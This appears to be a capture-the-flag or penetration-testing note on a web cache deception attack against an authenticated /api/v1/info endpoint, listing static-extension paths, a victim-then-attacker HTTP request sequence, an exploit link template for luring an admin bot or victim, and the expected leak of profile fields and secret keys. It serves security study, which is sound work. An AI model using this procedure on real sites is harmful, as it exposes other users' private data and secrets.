# API info static-extension cache deception

## Context

Authenticated JSON profile/API endpoint cached when requested through a static-looking URL.

## Requirements

- Sensitive endpoint such as `/api/v1/info`
- CDN or reverse proxy caching by file extension
- Victim must visit the deception URL while authenticated
- Attacker must fetch the same URL after cache is primed

## Working deception paths

```
/api/v1/info.css
/api/v1/info.min.css
/api/v1/info/test.css
/api/v1/info.js
/api/v1/info.png
```

Nested segment form also mapped back to the same handler:

```
/api/v1/info/<任意>.css
```

## Minimal proof sequence

```http
# 1) victim poisons cache
GET /api/v1/info.css HTTP/1.1
Host: target
Cookie: token=<victim>

# 2) attacker reads cached body
GET /api/v1/info.css HTTP/1.1
Host: target
```

## Expected signal

- Step 1: `200` with victim JSON, cacheable headers
- Step 2: `200` with same JSON and no session cookie

## Exploit link template

```
https://<host>/api/v1/info.css
```

Send to admin/reviewer bot or victim user.

## Why curl-only testing fails sometimes

Unauthenticated `curl` probes made before victim priming may cache `301` empty responses or hit a different cache bucket. Prefer:

1. Authenticated priming first
2. Browser or clean unauthenticated read second

## Failed assumptions

- Reading `/api/v1/info` directly is not cache deception; it is normal authenticated access
- `.json` and `.html` variants returned `no-cache` / `DYNAMIC` on Catch me and were not the right primitive

## Impact

Disclosure of profile fields and secret `key` values from cached victim responses.
